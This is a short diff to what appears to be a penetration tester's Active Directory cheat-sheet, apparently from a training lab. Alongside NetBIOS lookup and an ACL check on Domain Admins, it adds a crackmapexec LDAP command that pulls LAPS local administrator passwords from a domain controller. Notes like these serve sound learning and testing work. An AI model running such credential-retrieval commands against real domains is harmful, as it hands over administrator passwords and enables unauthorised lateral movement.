@@ -35,3 +35,8 @@ nmblookup -A $IPAdress
 
 #Get-ACL for users in group
 (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local').Access | ?{$_.IdentityReference -match 'studentuser1'}
+
+
+
+#Get LAPS password remotly
+sudo crackmapexec ldap dc01.doamin.local -u 'uname' -p 'passwd' --kdcHost dc01.domain.local -M LAPS 
